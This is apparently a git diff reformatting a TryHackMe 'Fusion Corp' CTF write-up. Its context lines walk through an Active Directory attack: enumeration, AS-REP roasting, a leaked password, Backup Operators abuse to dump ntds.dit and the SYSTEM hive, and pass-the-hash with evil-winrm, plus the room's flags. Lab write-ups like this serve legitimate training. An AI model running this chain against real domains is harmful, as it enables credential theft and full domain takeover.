@@ -2,38 +2,40 @@
 sticker: emoji//1f574-fe0f
 ---
 
-# PORT SCAN
----
+# FUSION CORP
 
-| PORT     | SERVICE         |
-|----------|-----------------|
-| 53/tcp   | domain          |
-| 80/tcp   | http            |
-| 88/tcp   | kerberos-sec    |
-| 135/tcp  | msrpc           |
-| 139/tcp  | netbios-ssn     |
-| 389/tcp  | ldap            |
-| 445/tcp  | microsoft-ds    |
-| 464/tcp  | kpasswd5        |
-| 593/tcp  | ncacn_http      |
-| 636/tcp  | tcpwrapped      |
-| 3268/tcp | ldap            |
-| 3269/tcp | tcpwrapped      |
-| 3389/tcp | ms-wbt-server   |
-| 5985/tcp | http            |
-| 9389/tcp | mc-nmf          |
-| 49666/tcp| msrpc           |
-| 49668/tcp| msrpc           |
-| 49669/tcp| ncacn_http      |
-| 49670/tcp| msrpc           |
-| 49677/tcp| msrpc           |
-| 49690/tcp| msrpc           |
-| 49707/tcp| msrpc           |
+## PORT SCAN
 
+***
 
+| PORT      | SERVICE       |
+| --------- | ------------- |
+| 53/tcp    | domain        |
+| 80/tcp    | http          |
+| 88/tcp    | kerberos-sec  |
+| 135/tcp   | msrpc         |
+| 139/tcp   | netbios-ssn   |
+| 389/tcp   | ldap          |
+| 445/tcp   | microsoft-ds  |
+| 464/tcp   | kpasswd5      |
+| 593/tcp   | ncacn\_http   |
+| 636/tcp   | tcpwrapped    |
+| 3268/tcp  | ldap          |
+| 3269/tcp  | tcpwrapped    |
+| 3389/tcp  | ms-wbt-server |
+| 5985/tcp  | http          |
+| 9389/tcp  | mc-nmf        |
+| 49666/tcp | msrpc         |
+| 49668/tcp | msrpc         |
+| 49669/tcp | ncacn\_http   |
+| 49670/tcp | msrpc         |
+| 49677/tcp | msrpc         |
+| 49690/tcp | msrpc         |
+| 49707/tcp | msrpc         |
 
-# RECONNAISSANCE
----
+## RECONNAISSANCE
+
+***
 
 Based on the scan, we can identify the `dc` and `domain`, let's add them to `/etc/hosts`:
 
@@ -54,7 +56,6 @@ SMB1 disabled -- no workgroup available
 ```
 
 Anonymous login works but we cannot see shares, let's try ldap:
-
 
 ```bash
 ldapsearch -x -H ldap://10.10.231.61 -s base namingcontexts
@@ -100,7 +101,7 @@ Anonymous bind is not enabled on ldap, unlucky.
 
 Since we cannot see anything interesting on here, we can proceed to analyze the website on port `80`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615133536.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615133536.png)
 
 We got some stuff on here, let's try to fuzz to find more hidden directories:
 
@@ -148,19 +149,17 @@ JS                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 2
 
 `/backup` seems interesting, let's check it out:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615133648.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615133648.png)
 
 We got `employees.ods` on here, we can open this file with `libreoffice` or just `excel`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615134252.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615134252.png)
 
 Let's start exploitation.
 
+## EXPLOITATION
 
-
-# EXPLOITATION
----
+***
 
 We got some usernames, since Kerberos is enabled, we can use `kerbrute`:
 
@@ -201,7 +200,6 @@ $krb5asrep$18$lparker@FUSION.CORP:e14f0a12dc0b1c6b53280c85458da7fb$d5eab59340d7c
 ```
 
 As we can see `lparker` doesn't have `dont_require_preauth` flag disabled, this makes the user vulnerable to `AS-REP Roasting`, for some reason, when I tried cracking the hash that kerbrute gave me, it didn't work, so, we can request the right hash using `GetNPUsers.py`:
-
 
 ```bash
 GetNPUsers.py fusion.corp/lparker -no-pass -dc-ip 10.10.21.37
@@ -244,16 +242,15 @@ MATCH (n)
 DETACH DELETE n
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615143015.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615143015.png)
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615143114.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615143114.png)
 
 As seen, we got another user named `jmurphy` which is a member of `Backup Operators`, if we get access to this account, we can exploit this to get a copy of the HKLM SAM and SYSTEM hives to extract the NTLM hash for the admin user.
 
 While analyzing `bloodhound`'s output, we can check this on the `Object Informatiom` for the user:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615144821.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615144821.png)
 
 As seen in the description, the password is set to:
 
@@ -273,10 +270,9 @@ WINRM       10.10.21.37     5985   FUSION-DC        [+] fusion.corp\jmurphy:u8WC
 
 They work, let's start privilege escalation.
 
+## PRIVILEGE ESCALATION
 
-
-# PRIVILEGE ESCALATION
----
+***
 
 We already know that the path we must follow to get administrator is:
 
@@ -337,7 +333,7 @@ upload SeBackupPrivilegeCmdLets.dll
 upload diskshadow.txt
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615155605.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615155605.png)
 
 Next step is to create the shadow copy:
 
@@ -345,7 +341,7 @@ Next step is to create the shadow copy:
 diskshadow.exe /s .\diskshadow.txt  
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615155639.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615155639.png)
 
 Now, we need to use the DLLs to bypass the ACLs and copy `ntds.dit`:
 
@@ -361,7 +357,7 @@ Nice, now we need to extract the SYSTEM hive:
 reg save HKLM\SYSTEM C:\tmp\system  
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615155755.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615155755.png)
 
 Let's download both files into our machine:
 
@@ -411,7 +407,7 @@ We got our hash, let's use evil-winrm:
 evil-winrm -i IP -u Administrator -H '9653b02d945329c7270525c4c2a69c67'
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615165728.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615165728.png)
 
 We can now read all flags:
 
@@ -426,5 +422,4 @@ THM{b4aee2db2901514e28db4242e047612e}
 THM{f72988e57bfc1deeebf2115e10464d15}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615165944.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615165944.png)
